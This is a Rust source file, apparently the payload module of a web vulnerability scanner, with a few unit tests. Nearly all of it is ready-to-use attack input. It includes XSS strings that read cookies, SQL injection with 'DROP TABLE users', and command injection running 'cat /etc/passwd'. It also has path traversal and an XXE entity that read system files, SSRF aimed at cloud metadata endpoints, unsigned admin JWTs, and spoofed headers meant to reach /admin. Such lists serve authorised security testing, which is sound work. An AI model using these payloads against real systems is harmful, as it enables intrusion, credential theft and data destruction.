pub struct WebPayloads;

impl WebPayloads {
    pub fn xss() -> Vec<&'static str> {
        vec![
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'><script>alert(document.cookie)</script>",
        ]
    }

    pub fn sqli() -> Vec<&'static str> {
        vec![
            "'",
            "\" OR \"1\"=\"1",
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
    }

    pub fn command_injection() -> Vec<&'static str> {
        vec![
            "127.0.0.1; ls",
            "127.0.0.1 && whoami",
            "127.0.0.1 | cat /etc/passwd",
            "127.0.0.1 `id`",
        ]
    }

    pub fn path_traversal() -> Vec<&'static str> {
        vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
    }

    pub fn ssrf() -> Vec<&'static str> {
        vec![
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://127.0.0.1:22",
            "file:///etc/passwd",
        ]
    }

    pub fn ssti() -> Vec<&'static str> {
        vec!["{{7*7}}", "{{config}}", "${7*7}", "<%= 7*7 %>"]
    }

    pub fn xxe() -> Vec<&'static str> {
        vec![
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        ]
    }

    pub fn jwt() -> Vec<&'static str> {
        vec![
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
            "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"admin\"}.",
        ]
    }

    pub fn headers() -> Vec<(&'static str, &'static str)> {
        vec![
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Forwarded-Host", "127.0.0.1"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-HTTP-Method-Override", "PUT"),
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xss_payloads_not_empty() {
        let payloads = WebPayloads::xss();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_sqli_payloads_not_empty() {
        let payloads = WebPayloads::sqli();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_ssti_contains_math() {
        let payloads = WebPayloads::ssti();
        assert!(payloads.iter().any(|p| p.contains("7*7")));
    }

    #[test]
    fn test_headers_not_empty() {
        let headers = WebPayloads::headers();
        assert!(!headers.is_empty());
    }
}
